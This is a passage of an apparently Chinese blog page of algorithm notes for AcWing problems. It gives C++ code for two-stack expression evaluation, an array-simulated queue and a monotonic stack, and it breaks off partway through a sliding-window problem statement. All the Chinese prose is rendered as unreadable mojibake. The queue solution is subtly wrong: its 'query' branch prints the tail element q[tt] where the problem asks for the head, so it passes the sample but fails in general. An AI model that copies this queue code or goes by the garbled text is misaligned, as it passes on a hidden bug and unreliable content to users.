class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; op;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> b = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">int</span> a = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">char</span> c = op.<span class="built_in">top</span>(); op.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: nums.<span class="built_in">push</span>(a + b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: nums.<span class="built_in">push</span>(a - b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: nums.<span class="built_in">push</span>(a * b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: nums.<span class="built_in">push</span>(a / b); <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; pr&#123;&#123;<span class="string">&#x27;+&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;*&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;/&#x27;</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line">  string str;</span><br><span class="line">  cin &gt;&gt; str;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="type">char</span> c = str[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">      <span class="type">int</span> j = i, x = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; str.<span class="built_in">size</span>() &amp;&amp; <span class="built_in">isdigit</span>(str[j])) x = <span class="number">10</span> * x + str[j++] - <span class="string">&#x27;0&#x27;</span>;  <span class="comment">// j++å•¦, å¦åˆ™æŠ¥TLE</span></span><br><span class="line">      nums.<span class="built_in">push</span>(x);</span><br><span class="line">      i = j - <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      op.<span class="built_in">push</span>(c);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">size</span>() &amp;&amp; op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) <span class="built_in">eval</span>();</span><br><span class="line">      op.<span class="built_in">pop</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">size</span>() &amp;&amp; op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span> &amp;&amp; pr[op.<span class="built_in">top</span>()] &gt;= pr[c]) <span class="built_in">eval</span>();</span><br><span class="line">      op.<span class="built_in">push</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (op.<span class="built_in">size</span>()) <span class="built_in">eval</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums.<span class="built_in">top</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é˜Ÿåˆ—">é˜Ÿåˆ—</h1><h2 id="AcWing-829-æ¨¡æ‹Ÿé˜Ÿåˆ—"><a href="https://www.acwing.com/problem/content/831/">AcWing 829. æ¨¡æ‹Ÿé˜Ÿåˆ—</a></h2><p>å®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—åˆå§‹ä¸ºç©ºï¼Œæ”¯æŒå››ç§æ“ä½œï¼š</p><ol><li><code>push x</code> â€“ å‘é˜Ÿå°¾æ’å…¥ä¸€ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼›</li><li><code>pop</code> â€“ ä»é˜Ÿå¤´å¼¹å‡ºä¸€ä¸ªæ•°ï¼›</li><li><code>empty</code> â€“ åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼›</li><li><code>query</code> â€“ æŸ¥è¯¢é˜Ÿå¤´å…ƒç´ ã€‚</li></ol><p>ç°åœ¨è¦å¯¹é˜Ÿåˆ—è¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> ä¸ªæ“ä½œï¼Œå…¶ä¸­çš„æ¯ä¸ªæ“ä½œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> å’Œæ“ä½œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> éƒ½è¦è¾“å‡ºç›¸åº”çš„ç»“æœã€‚</p><h4 id="è¾“å…¥æ ¼å¼-3">è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œè¡¨ç¤ºæ“ä½œæ¬¡æ•°ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œå‘½ä»¤ï¼Œæ“ä½œå‘½ä»¤ä¸º <code>push x</code>ï¼Œ<code>pop</code>ï¼Œ<code>empty</code>ï¼Œ<code>query</code> ä¸­çš„ä¸€ç§ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-3">è¾“å‡ºæ ¼å¼</h4><p>å¯¹äºæ¯ä¸ª <code>empty</code> å’Œ <code>query</code> æ“ä½œéƒ½è¦è¾“å‡ºä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œæ¯ä¸ªç»“æœå ä¸€è¡Œã€‚</p><p>å…¶ä¸­ï¼Œ<code>empty</code> æ“ä½œçš„æŸ¥è¯¢ç»“æœä¸º <code>YES</code> æˆ– <code>NO</code>ï¼Œ<code>query</code> æ“ä½œçš„æŸ¥è¯¢ç»“æœä¸ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºé˜Ÿå¤´å…ƒç´ çš„å€¼ã€‚</p><h4 id="æ•°æ®èŒƒå›´-3">æ•°æ®èŒƒå›´</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>M</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>x</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br>æ‰€æœ‰æ“ä½œä¿è¯åˆæ³•ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-3">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>10push 6emptyquerypopemptypush 3push 4popquerypush 6</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-3">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>NO6YES4</code></pre><h3 id="æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—">æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—</h3><blockquote><p>æ¨¡æ‹Ÿé˜Ÿåˆ—, åˆå§‹åŒ–: hh = 0, tt = -1,  å…¥é˜Ÿåˆ—: q[++tt] = x,  æŸ¥ç©º: hh &lt;= tt</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> q[kN], hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;push&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      q[++tt] = x;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;pop&quot;</span>) &#123;</span><br><span class="line">      hh++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;query&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, q[tt]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;empty&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (hh &lt;= tt? <span class="string">&quot;NO&quot;</span>: <span class="string">&quot;YES&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å•è°ƒæ ˆ">å•è°ƒæ ˆ</h1><h2 id="AcWing-830-å•è°ƒæ ˆ"><a href="https://www.acwing.com/problem/content/832/">AcWing 830. å•è°ƒæ ˆ</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> çš„æ•´æ•°æ•°åˆ—ï¼Œè¾“å‡ºæ¯ä¸ªæ•°å·¦è¾¹ç¬¬ä¸€ä¸ªæ¯”å®ƒå°çš„æ•°ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¾“å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span></span></span></span>ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-4">è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ï¼Œè¡¨ç¤ºæ•°åˆ—é•¿åº¦ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´æ•°æ•°åˆ—ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-4">è¾“å‡ºæ ¼å¼</h4><p>å…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸ªæ•´æ•°ï¼Œå…¶ä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªæ•°è¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªæ•°çš„å·¦è¾¹ç¬¬ä¸€ä¸ªæ¯”å®ƒå°çš„æ•°ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¾“å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span></span></span></span>ã€‚</p><h4 id="æ•°æ®èŒƒå›´-4">æ•°æ®èŒƒå›´</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mtext>æ•°åˆ—ä¸­å…ƒç´ </mtext><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le æ•°åˆ—ä¸­å…ƒç´  \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•°åˆ—ä¸­å…ƒç´ </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-4">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>53 4 2 7 5</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-4">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>-1 3 -1 2 2</code></pre><h3 id="å•è°ƒæ ˆ-2">å•è°ƒæ ˆ</h3><h4 id="STLç‰ˆæœ¬">STLç‰ˆæœ¬</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stk.<span class="built_in">size</span>() &amp;&amp; stk.<span class="built_in">top</span>() &gt;= x) stk.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (stk.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, stk.<span class="built_in">top</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°ç»„æ¨¡æ‹Ÿç‰ˆæœ¬">æ•°ç»„æ¨¡æ‹Ÿç‰ˆæœ¬</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> stk[kN], tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (tt &amp;&amp; stk[tt] &gt;= x) tt--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (tt? stk[tt]: <span class="number">-1</span>));</span><br><span class="line">    stk[++tt] = x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å•è°ƒé˜Ÿåˆ—">å•è°ƒé˜Ÿåˆ—</h1><h2 id="AcWing-154-æ»‘åŠ¨çª—å£"><a href="acwing.com/problem/content/156/">AcWing 154. æ»‘åŠ¨çª—å£</a></h2><p>ç»™å®šä¸€ä¸ªå¤§å°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">n \le 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span> çš„æ•°ç»„ã€‚</p><p>æœ‰ä¸€ä¸ªå¤§å°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> çš„æ»‘åŠ¨çª—å£ï¼Œå®ƒä»æ•°ç»„çš„æœ€å·¦è¾¹ç§»åŠ¨åˆ°æœ€å³è¾¹ã€‚</p><p>ä½ åªèƒ½åœ¨çª—å£ä¸­çœ‹åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 